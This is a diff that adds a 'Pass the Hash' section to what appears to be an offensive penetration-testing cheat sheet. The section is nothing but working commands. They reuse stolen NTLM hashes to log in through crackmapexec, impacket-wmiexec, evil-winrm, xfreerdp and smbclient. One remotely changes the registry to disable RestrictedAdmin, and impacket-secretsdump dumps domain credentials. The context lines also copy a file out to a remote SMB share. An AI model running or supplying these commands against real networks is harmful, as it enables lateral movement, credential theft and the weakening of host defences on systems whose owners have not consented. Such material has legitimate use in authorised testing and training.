@@ -1647,3 +1647,20 @@ copy test.txt \\192.168.45.204\share\test.txt
 net use /delete \\192.168.45.204\share
 ```
 
+**Pass the Hash**
+```
+crackmapexec smb 172.16.50.4 -u user -H BD1C6503987F8FF006296118F359FA79  -d domain.local
+
+impacket-wmiexec domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+
+evil-winrm -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
+
+xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
+	- account restrictions are preventing the user from signing in:
+		- crackmapexec smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+
+smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
+
+impacket-secretsdump ituser@<any-domain-joined-machine> -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+
+```
